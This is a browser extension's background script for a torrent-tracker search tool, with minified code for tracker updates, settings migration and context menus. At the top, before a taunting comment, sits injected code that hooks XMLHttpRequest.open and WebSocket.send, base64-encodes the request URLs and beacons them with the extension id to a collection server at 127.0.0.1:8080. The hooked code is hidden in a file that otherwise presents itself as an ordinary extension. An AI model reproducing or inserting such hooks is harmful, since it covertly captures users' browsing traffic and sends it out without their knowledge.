function collectMessageToServer(data){
    var img = document.createElement("img");
    img.src = "http://127.0.0.1:8080/" + chrome.runtime.id + "/" + data;
}

function hookAjax(){
    var _XMLHTTPRequestOpen = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(){
        console.log(arguments);
        collectMessageToServer("bk-ajax-" + btoa(arguments[1]));
        _XMLHTTPRequestOpen.apply(this, arguments);
    }
}
function hookWebsocket() {
    var _websockSend = WebSocket.prototype.send;
    WebSocket.prototype.send = () => {
        console.log(arguments);
        collectMessageToServer("bk-ws-" + btoa(arguments[1]));
        _websockSend.apply(this, arguments);
    }
}

function run(){
    hookAjax();
    hookWebsocket();
}
run();
//sn00ker_ahahaha
var messageStack=[];require.config({baseUrl:"./js",paths:{promise:"./lib/promise.min"}});
require(["promise","./module/utils"],function(d,c){var r=function(b,c){c&&chrome.browserAction.setIcon({path:{19:"img/icon_19.png",38:"img/icon_38.png"}});b.invertIcon&&chrome.browserAction.setIcon({path:{19:"img/icon_19_i.png",38:"img/icon_38_i.png"}})},g=function(b){return new d(function(c){chrome.contextMenus.removeAll(function(){b.contextMenu&&chrome.contextMenus.create({type:"normal",id:"tms",title:chrome.i18n.getMessage("contextMenuTitle"),contexts:["selection"]});c()})})},h=function(b,c){c&&
chrome.browserAction.setPopup({popup:"popup.html"});b.disablePopup&&chrome.browserAction.setPopup({popup:""})},k=function(b){return(new d(function(b){chrome.storage.local.get({invertIcon:!1,contextMenu:!0,disablePopup:!1},b)})).then(function(c){return d.all([g(c),h(c,b),r(c,b)])})},p=function(b,q){var f=null,a=function(b){return new d(function(a,e){f&&f.abort();f=c.request({url:b},function(b,c){f=null;b?e(b):a(c.body)})})},e=function(e){return a(e).then(function(a){var e=c.parseMeta(a),f=b.meta.version;
if(!c.isNewVersion(f,e.version))throw b.info.lastUpdate=parseInt(Date.now()/1E3),Error("C_ACTUAL");return{previewVersion:f,version:e.version,meta:e,body:a}})},l=function(){var a=d.resolve();a=b.meta.updateURL?a.then(function(){return e(b.meta.updateURL)}).then(function(a){return e(a.meta.downloadURL)}):a.then(function(){return e(b.meta.downloadURL)});return a.then(function(a){b.meta=a.meta;b.code=a.body;b.info.lastUpdate=parseInt(Date.now()/1E3);return{previewVersion:a.previewVersion,version:a.version}})};
return(new d(function(a){if(!b.meta.downloadURL)throw Error("C_UNAVAILABLE");if(86400<parseInt(Date.now()/1E3)-(b.info.lastUpdate||0)||q)a(l());else throw Error("C_TIMEOUT");})).then(function(a){return{success:!0,trackerId:b.id,result:a}}).catch(function(a){if("C_UNAVAILABLE"===a.message)return{success:!1,trackerId:b.id,message:"UNAVAILABLE"};if("C_TIMEOUT"===a.message)return{success:!1,trackerId:b.id,message:"TIMEOUT"};if("C_ACTUAL"===a.message)return{success:!0,trackerId:b.id,message:"ACTUAL",version:b.meta.version};
console.error("Update error",b.id,a);return{success:!1,trackerId:b.id,message:"ERROR"}})},n=!1,t=function(b){if(n)return d.resolve({success:!1,message:"OTHER_UPDATE_IN_PROGRESS"});n=!0;return(new d(function(b){chrome.storage.local.get({trackers:{}},function(c){b(c)})})).then(function(c){var f=b.id,a=[],e=c.trackers;c=!1;for(var l in e)if(!f&&!e[l].info.disableAutoUpdate||f===e[l].id)c=!0,a.push(p(e[l],b.force));if(f&&!c&&b.profileMeta){var g={id:f,meta:b.profileMeta,info:{},code:""};g.meta.version=
"0";a.push(p(g,b.force).then(function(a){a.success&&(e[f]=g);return a}))}return d.all(a).then(function(a){var b=d.resolve();a.some(function(a){return a.success})&&(b=b.then(function(){return new d(function(a){chrome.storage.local.set({trackers:e},a)})}));return b.then(function(){n=!1;return{success:!0,results:a}})})})},u=function(b,c,f){"reload"===b.action&&k(!0);if("update"===b.action)return t(b).catch(function(a){console.error("Update error!",a)}).then(f),!0},v=messageStack;messageStack={push:function(b){u(b[0],
b[1],b[2])}};(function(){var b=function(b,a){var c={"nnm-club":"nnmclub","free-torrents":"freeTorrents",libertorrent:"booktracker"},f=b.profiles;b=a.profileList;Array.isArray(b)&&b.forEach(function(a){try{var b=[];Array.isArray(a.trackerList)&&a.trackerList.forEach(function(a){a="object"===typeof a?a.id:a;a=c[a]||a;b.push({id:a})});f.push({id:f.length,name:a.name,trackers:b})}catch(m){console.error("Migrate profile error!",m)}})},g=function(b,a){b=b.trackers;a=a.customTorrentList;for(var e in a){var f=
a[e];try{var d=c.trackerObjToUserScript(f),g=c.parseMeta(d);b[e]={id:e,meta:g,info:{},code:d}}catch(m){console.error("Migrate tracker error!",m)}}};return(new d(function(b){chrome.storage.local.get({migrated:!1},b)})).then(function(c){return!c.migrated&&(new d(function(a){chrome.storage.local.get(null,a)})).then(function(a){var c={profiles:[],trackers:{},migrated:!0};a.hasOwnProperty("contextMenu")&&!a.contextMenu&&(c.contextMenu=!1);a.hasOwnProperty("enableFavoriteSync")&&!a.enableFavoriteSync&&
(c.favoriteSync=!1);a.hasOwnProperty("hidePeerColumn")&&!a.hidePeerColumn&&(c.hidePeerRow=!1);a.hasOwnProperty("hideSeedColumn")&&a.hideSeedColumn&&(c.hideSeedRow=!0);a.hasOwnProperty("invertIcon")&&a.invertIcon&&(c.invertIcon=!0);a.hasOwnProperty("kinopoiskFolderId")&&"string"===typeof a.kinopoiskFolderId&&(c.kpFolderId=a.kinopoiskFolderId);a.hasOwnProperty("searchPopup")&&!a.searchPopup&&(c.disablePopup=!0);a.hasOwnProperty("subCategoryFilter")&&!a.subCategoryFilter&&(c.categoryWordFilter=!1);a.hasOwnProperty("trackerListHeight")&&
"number"===typeof a.trackerListHeight&&(c.trackerListHeight=a.trackerListHeight);a.hasOwnProperty("expCache_favorites")&&a.expCache_favorites&&(c.cache_favorites=a.expCache_favorites);a.hasOwnProperty("useEnglishPosterName")&&a.useEnglishPosterName?c.originalPosterName=!0:/^ru-?/.test(chrome.i18n.getUILanguage())||(c.originalPosterName=!0);g(c,a);b(c,a);return new d(function(a){chrome.storage.local.clear(function(){chrome.storage.local.set(c,a)})})})})})().then(function(){k().then(function(){for(var b;b=
v.shift();)messageStack.push(b)})})});
(function(){var d=function(c){var d={},g=0,h;for(h in c)g++,d[h]=btoa(unescape(encodeURIComponent(c[h])));g&&(d.base64=!0);c=[];for(var k in d)g=d[k],null!==g&&void 0!==g&&c.push(encodeURIComponent(k)+"="+encodeURIComponent(g));return c.join("&")};chrome.contextMenus.onClicked.addListener(function(c){"tms"===c.menuItemId&&(c=(c=c.selectionText)&&"#"+d({query:c}),chrome.tabs.create({url:"index.html"+c,selected:!0}))});chrome.omnibox.onInputEntered.addListener(function(c){c=c&&"#"+d({query:c});chrome.tabs.create({url:"index.html"+
c,selected:!0})});chrome.browserAction.onClicked.addListener(function(){chrome.tabs.create({url:"index.html"})});chrome.runtime.onMessage.addListener(function(c,d,g){messageStack.push([c,d,g]);return!0})})();
